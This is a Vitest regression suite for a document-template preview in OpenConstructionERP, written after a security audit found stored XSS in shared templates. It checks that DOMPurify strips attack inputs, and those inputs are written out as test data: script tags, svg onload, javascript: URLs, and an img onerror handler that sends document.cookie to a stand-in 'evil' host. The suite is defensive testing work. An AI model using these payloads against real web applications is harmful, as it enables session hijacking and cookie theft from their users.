// OpenConstructionERP — property-dev document-template preview XSS suite.
//
// Security audit 2026-06-22 finding #2: the custom document-template
// editor renders the template body into ``dangerouslySetInnerHTML`` in a
// live preview pane. Templates are development/tenant-SHARED resources, so
// a body authored by one user is auto-previewed in another staff member's
// authenticated session. The original code rendered the HTML branch
// verbatim (``return debouncedContent``) behind a comment falsely claiming
// "React strips <script>" — it does not, and event-handler (onerror/
// onload) and javascript: vectors execute regardless.
//
// Fix: every preview branch is now routed through
// ``DOMPurify.sanitize(..., PREVIEW_SANITIZE_CONFIG)`` before it reaches
// the DOM. This test pins that behaviour against the SAME config the
// component uses at render time, so the wrapper can never silently
// regress. Run against the ORIGINAL code these assertions fail (the live
// <script>/<img onerror>/<iframe>/<svg onload> nodes survive).

import { describe, expect, it } from 'vitest';
import DOMPurify from 'isomorphic-dompurify';
import { PREVIEW_SANITIZE_CONFIG } from '../DocumentTemplatesSettingsPage';

/** Run the production preview sanitise pipeline against an input string. */
function sanitisePreview(input: string): string {
  return DOMPurify.sanitize(input, PREVIEW_SANITIZE_CONFIG);
}

/** Parse the sanitised HTML into a DOM fragment for structural asserts. */
function parse(html: string): HTMLDivElement {
  const host = document.createElement('div');
  host.innerHTML = html;
  return host;
}

describe('document-template preview XSS hardening', () => {
  it('strips raw <script> elements', () => {
    const out = sanitisePreview('<p>hello</p><script>alert(1)</script>');
    const frag = parse(out);
    expect(frag.querySelector('script')).toBeNull();
    expect(out.toLowerCase()).not.toContain('<script');
    // benign body markup survives so the preview stays useful.
    expect(frag.querySelector('p')?.textContent).toBe('hello');
  });

  it('strips inline event handlers (img onerror — cookie-theft vector)', () => {
    const out = sanitisePreview(
      '<img src=x onerror="fetch(\'//evil/?c=\'+document.cookie)">',
    );
    const frag = parse(out);
    const img = frag.querySelector('img');
    // DOMPurify may keep the <img> shell but MUST drop the handler.
    expect(img?.getAttribute('onerror')).toBeNull();
    expect(out.toLowerCase()).not.toContain('onerror');
  });

  it('strips <svg onload> event handlers', () => {
    const out = sanitisePreview('<svg onload="alert(document.domain)"></svg>');
    expect(out.toLowerCase()).not.toContain('onload');
  });

  it('drops <iframe> embeds', () => {
    const out = sanitisePreview('<iframe src="javascript:alert(1)"></iframe>');
    const frag = parse(out);
    expect(frag.querySelector('iframe')).toBeNull();
    expect(out.toLowerCase()).not.toContain('<iframe');
  });

  it('neutralises javascript: URLs on anchors', () => {
    const out = sanitisePreview('<a href="javascript:alert(1)">click</a>');
    const frag = parse(out);
    const href = frag.querySelector('a')?.getAttribute('href') ?? '';
    expect(href.toLowerCase()).not.toContain('javascript:');
    // the link text is preserved.
    expect(frag.querySelector('a')?.textContent).toBe('click');
  });

  it('keeps benign table/styling markup a printable template needs', () => {
    const out = sanitisePreview(
      '<table><tr><td style="font-weight:bold">Buyer</td></tr></table>',
    );
    const frag = parse(out);
    expect(frag.querySelector('table')).not.toBeNull();
    expect(frag.querySelector('td')?.textContent).toBe('Buyer');
  });
});
